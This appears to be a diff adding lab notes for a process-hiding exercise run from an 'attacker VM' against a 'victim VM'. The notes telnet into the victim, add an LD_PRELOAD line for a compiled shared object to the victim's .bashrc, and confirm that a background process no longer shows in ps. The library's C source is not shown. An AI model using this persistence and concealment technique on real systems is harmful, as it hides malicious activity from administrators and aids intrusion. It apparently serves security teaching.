@@ -1,0 +1,26 @@
+Source code ran in the Atatcker VM. 
+
+Telnet into victim VM 
+telent <user IP> 
+
+#Run a process for this example we will start a 'sleep' process that woll run in the backround. 
+sleep 9999 &
+#Validate its running
+ps aux | grep sleep
+
+#configure the bash scripting files 
+nano /home/victim/.bashrc
+#insert at the very end f the file 
+export LD_PRELOAD=/path/to/your/hideso.so
+
+#save and close.
+#compile hide.c script
+gcc -Wall -fPIC -shared -o hideso.so hideproc.c -ldl
+
+
+#restart shell 
+source ~/.bashrc
+
+#test, and view results
+ps aux | grep sleep
+
